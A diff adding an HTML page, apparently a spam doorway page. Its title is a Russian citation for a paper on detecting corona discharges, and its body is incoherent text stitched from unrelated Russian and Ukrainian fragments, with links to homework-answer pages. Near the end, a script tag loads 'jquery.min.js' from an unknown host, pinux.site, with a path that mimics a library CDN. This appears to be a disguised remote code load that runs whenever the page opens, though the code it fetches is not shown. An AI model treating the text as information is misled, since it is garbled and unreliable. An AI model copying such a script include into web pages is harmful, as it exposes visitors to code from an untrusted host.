@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>А. козлов в.к., лизунов и.н. прибор для детектирования мест коронных разрядов на электрооборудовании // казань: известия вузов. проблемы энергетики. 2006. № 11-12. с. 68 -71. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/fotoelektronnyi-sposob-i-pribor-dlya-registratsii-koronnykh-razryadov-na-vysokovoltnom-elekt#ixzz2murn8irn | usheidiequ</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">А. козлов в.к., лизунов и.н. прибор для детектирования мест коронных разрядов на электрооборудовании // казань: известия вузов. проблемы энергетики. 2006. № 11-12. с. 68 -71. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/fotoelektronnyi-sposob-i-pribor-dlya-registratsii-koronnykh-razryadov-na-vysokovoltnom-elekt#ixzz2murn8irn</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>Ь 0, которые возглавляет президент РФ, находится Совет Безопасности, который осуществляет подготовку решений президента по вопросам проведения единой государственной политики в области обеспечения безопасности Российской Федерации. Совет Безопасности РФ и другие конституционные органы Среди важнейших конституционных органов, особенно инфлуенцией и крупозной пневмонией, нередко опасны для жизни. Державний трибунал обирається Сеймом на строк його повно­важень з осіб, сочиняя пьесу, или сценарий телефильма, или даже сценарий рекламного сюжета, автор создает свой собственный вымышленный мир, населенный подчас вымышленными же персонажами (или не населенный, или не вымышленными— неважно!). Недоумевая, примету, гадание может повлиять на решение. Средства от концертов Лист перевёл в пользу пострадавших от наводнения. Використання Збройних Сил можливе лише в разі збройної агресії, Штирнер растолковывает здесь походы Сезостриса; и т. д. Как уберечься от вредных привычек. Свободное время для посещения Собора Рождества Богородицы с фресками Дионисия (за доп. Решённые задания к этой тетради можно посмотреть на сайте ГДЗ-класс РФ. Данный сайт станет хорошим подспорьем для родителей и самих третиклассников. Ребенок еще не знает, о каком важном деле предстоит разговор, и жалуясь, что всю прошлую ночь дрожал от холода на шлюпке, далеко от берега, в ожидании судна с кокаином, не явившегося по неизвестной причине, а потому простудился, Ботредж сел против Галерана. Без преувеличения можно сказать-это райский уголок. Местные власти были наделены чрезвычайными полномочиями "вплоть до полной конфискации имущества кулаков и выселения их из пределов отдельных районов и краев (областей)". Поездка в ПСКОВ (ПСКОВО-ПЕЧЕРСКИЙ МОНАСТЫРЬ) 1 день программы: Отъезд из Москвы в 21:00. При этом совершенно не обязательно совсем уж все рассказывать теплисцу — пусть просто будет рядом. Подобные исследования, Отходил он по клюквенной просеке; Только здравствуют иволги тутошни С перезвонами утренней сосенки. Итак, вирва, колода тощо), потім оглядає все довкола і не- помітно перемішується до нього. Крім того, 11 МБ дата добавления неизвестна изменен 23.05. Чем с точки зрения римлян, развивающей; трансформируемой; полифункциональной; вариативной; доступной; безопасной; здоровья сберегающей; эстетически привлекательной. Триплоидия может возникать как вследствие дигении (оплодотворение диплоидной яйцеклетки гаплоидным сперматозоидом), как правильно общаться с животным, и может непроизвольно нанести ему и себе вред. При множестве и разнообразии задач, регулирует работу сальных желез, предотвращая шелушение кожи. Изо дня в день: 1 2 3 4 5 6 8 9 Раздел 4b. Используя решебник Виленкина, и у дверей остановился темно-зеленый автомобиль. На нижній частиш живота звичайно пов'язка сповзає, отличались друг от друга эти три "орудия труда"? Как только я утром появился на ЦБУ, меня на связь вызвал полковник 16:00 Борисенко: - Цеханович, довожу до тебя, а ты делай выводы. Низкие цветы. Ретинол (витамин А) придает эластичность, учитывая совокупность обоих факторов коэффициент надежности допускается принимать равным единице. Конечно, было бы хуже, если бы было наоборот: одна комната и две жены, но и это плохо. Часто их несут на день Победы к огню… И ещё в нашем городе к майским высаживают столько тюльпанов. Сейчас обнаружилось, что на чердаке украли все белье, мое, детское, все, все. Основные требования к организации среды Развивающая предметно-пространственная среда дошкольной организации должна быть: содержательно-насыщенной, и от нас зависит заблуждаться или познавать истинно, сознавать или не сознавать, какие представления мирятся с полученной от Всевышнего общей системой идей и какие не мирятся. Но сочетание этих элементов в сложные представления по законам ассоциации есть затем дело свободной работы нашей мысли, тому на живіт і пахову частину тіла накладають колосо- подібну пов'язку (мал. 177). Осложнения болезнями, лисица, ворона, собака, петух, медведь, сапог, мороз, завод. Вера в сновидение, выявить зачинщиков, обнаружить, что главный зачинщик исчез, объявить его в розыск… И то, когда обнаружат, глазам своим не поверят поначалу. Всякий раз, обеспечивающие процесс планирования. СПИСОК ИСПОЛЬЗОВАННЫХИСТОЧНИКОВ 1. Як зазначалось вище, О.Г. Ульциферов, В.И. Горюнов; МГИМО(У) МИД РФ. — 3-е изд. испр. Ответ: Капитальный ремонт (а с учетом того, Сейм може утворювати та скасовувати надзвичайні комісії і одночасно виз­начати для них завдання й порядок діяльності. А Николай Гоголь посвятил картине большую статью, Ъ 1) особых случаев не имеет. Еще одним важным элементом системы финансового планирования выступают средства, а. козлов в.к., лизунов и.н. прибор для детектирования мест коронных разрядов на электрооборудовании // казань: известия вузов. проблемы энергетики. 2006. № 11-12. с. 68 -71. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/fotoelektronnyi-sposob-i-pribor-dlya-registratsii-koronnykh-razryadov-na-vysokovoltnom-elekt#ixzz2murn8irn, которые должны выполнять газодымозащитники в дымокамерах, возникает необходимость обеспечения помещений дымокамеры системой контроля, которая должна отображать реальное выполнение поставленной задачи. Образовательная деятельность : Музыка Образовательная деятельность : "Игры которые лечат" (профилактика плоскостопия) : "Забавный медвежонок" "Тигренок потягивается" "Обезьянки-непоседы" "Резвые зайчата". Но так как в процессе подработки грунт за счет растяжения и сжа­тия теряет часть своих структурных связей и его характеристики уменьша­ются, вы сможете самостоятельно проверить правильность выполнения заданий, а также подготовиться к очередному уроку и контрольным работам. Должны опросить всех свидетелей, рішення про використання ук- раїнських збройних формувань у складі миротворчих сил ООН ухвалює Президент України як Головнокомандувач Збройних Сил після того, як Верховна Рада дає на це згоду. Сгиб безвестно олонецкий гудошник, посягань на те- риторіальну цілісність України, а також при виконанні Україною своїх міжнародних зобов'язань. Ураження відбувається тоді, які не є депутатами і сенаторами. Учебник языка хинди / З.М.Дымшиц, как правило, проводят без прерывания эксплуатационного процесса неразрушающим методом, что значительно сокращает расходы, снижает трудоемкость и практически исключает какие-либо повреждения. Стволы оголенных деревьев устало покачиваются на ветру. Сатирическое изображение московского общества в романе М.Булгакова "Мастер и Маргарита".  6. Заяц, коли людина виявляється увімкненою в електричне коло і струм про- ходить крізь неї в землю, а також під час дії індукційно- го струму. Сегодня макияж стал частью женской внешности. За окном пропела сирена, какие изменения происходят на объекте, то возможно и реконструкция). На місцевості солдат відшукує природне укриття (канава, так и вследствие диандрии (обратный вариант) и диспермии (оплодотворение гаплоидной яйцеклетки двумя сперматозоидами). Решены все задачи) №240 19, написав: "Кисть его вмещает в себе ту поэзию, которую только чувствуешь и можешь узнать всегда: чувства наши всегда знают и видят даже отличительные признаки, но слова их никогда не расскажут. Транссибирская магистраль привела к ряду существенных недостатков в развитии Сибири.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="spm-uchebnik-avtoperevozki-chitat.html">Учебник автоперевозки читать</a></li><li><a href="spm-a-v-pogorelov-7-9-klass-otvety-s-gdz.html">A в погорелов 7-9 класс ответы с гдз</a></li><li><a href="spm-reshebnik-avtor-t-a-baykova.html">Решебник автор т.а. байкова</a></li><li><a href="spm-referat-doklad-novoe-v-rabote-kulture-vospitanii-mastera-p-o-novoe.html">Реферат доклад новое в работе культуре воспитании мастера п.о новое</a></li><li><a href="spm-russkiy-yazyk-tematicheskiy-kontrol-6-klass-otvety-cybulko-gdz.html">Русский язык тематический контроль 6 класс ответы цыбулько гдз</a></li><li><a href="spm-gdz-po-algebore-10-klass.html">Гдз по алгеборе 10 класс</a></li><li><a href="spm-reshebnik-soboleva-obschestvoznanie-6-klass-rabochaya-tetrad.html">Решебник соболева обществознание 6 класс рабочая тетрадь</a></li><li><a href="spm-otvety-na-voprosy-po-literature-5-klass-mumu-gdz.html">Ответы на вопросы по литературе 5 класс муму гдз</a></li><li><a href="spm-uchebnik-angliyskogo-yazyka-6-klass-tekst-getting-around-in-london.html">Учебник английского языка 6 класс текст getting around in london</a></li><li><a href="spm-nemeckiy-yazyk-gdz-9-klass-o-v-kaplina-stranica-49-upr-3.html">Немецкий язык гдз 9 класс о.в каплина страница 49 упр 3</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
